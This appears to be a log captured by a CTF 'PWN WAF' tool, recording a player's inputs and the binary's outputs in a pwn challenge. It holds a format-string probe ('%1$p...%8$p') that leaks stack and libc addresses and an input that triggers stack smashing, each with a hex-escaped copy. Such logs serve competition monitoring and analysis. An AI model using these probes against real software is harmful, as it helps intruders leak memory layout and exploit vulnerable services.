// Date: 2021-11-27 08:51:33
// SKYCTF PWN WAF
// Deved By I0gan
team_name: Ph0en1x

user_name: Bad Player


<-------------------- read ------------------>
%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p

r_0 = "\x25\x31\x24\x70\x2e\x25\x32\x24\x70\x2e\x25\x33\x24\x70\x2e\x25\x34\x24\x70\x2e\x25\x35\x24\x70\x2e\x25\x36\x24\x70\x2e\x25\x37\x24\x70\x2e\x25\x38\x24\x70\x0a"

<-------------------- write ----------------->
0x7ffec1f7d070.0x100.0x7fc7d87fb360.0x7fc7d8aca770.0x7fc7d8cf1700.0x7ffec1f7d08e.0x2400000000000000.0x2432252e70243125
@Hrÿ«--+--

w_0 = "\x30\x78\x37\x66\x66\x65\x63\x31\x66\x37\x64\x30\x37\x30\x2e\x30\x78\x31\x30\x30\x2e\x30\x78\x37\x66\x63\x37\x64\x38\x37\x66\x62\x33\x36\x30\x2e\x30\x78\x37\x66\x63\x37\x64\x38\x61\x63\x61\x37\x37\x30\x2e\x30\x78\x37\x66\x63\x37\x64\x38\x63\x66\x31\x37\x30\x30\x2e\x30\x78\x37\x66\x66\x65\x63\x31\x66\x37\x64\x30\x38\x65\x2e\x30\x78\x32\x34\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x2e\x30\x78\x32\x34\x33\x32\x32\x35\x32\x65\x37\x30\x32\x34\x33\x31\x32\x35\x0a\x40\x48\x72\xd8\xc7\x7f\x2d\x2d\x2b\x2d\x2d\x0a"

<-------------------- read ------------------>
123

r_1 = "\x31\x32\x33\x0a"

<-------------------- write ----------------->
123
.0x100.0x7fc7d87fb360.0x7fc7d8cf1700.0x7d.0x7ffec1f7d08e.0x2400000000000000.0x2432252e0a333231
@Hrÿ«*** stack smashing detected ***: /pwn terminated
logger: chall env released
logger: sky_token_is_wrong

w_1 = "\x31\x32\x33\x0a\x2e\x30\x78\x31\x30\x30\x2e\x30\x78\x37\x66\x63\x37\x64\x38\x37\x66\x62\x33\x36\x30\x2e\x30\x78\x37\x66\x63\x37\x64\x38\x63\x66\x31\x37\x30\x30\x2e\x30\x78\x37\x64\x2e\x30\x78\x37\x66\x66\x65\x63\x31\x66\x37\x64\x30\x38\x65\x2e\x30\x78\x32\x34\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x2e\x30\x78\x32\x34\x33\x32\x32\x35\x32\x65\x30\x61\x33\x33\x33\x32\x33\x31\x0a\x40\x48\x72\xd8\xc7\x7f\x2a\x2a\x2a\x20\x73\x74\x61\x63\x6b\x20\x73\x6d\x61\x73\x68\x69\x6e\x67\x20\x64\x65\x74\x65\x63\x74\x65\x64\x20\x2a\x2a\x2a\x3a\x20\x2f\x70\x77\x6e\x20\x74\x65\x72\x6d\x69\x6e\x61\x74\x65\x64\x0a"
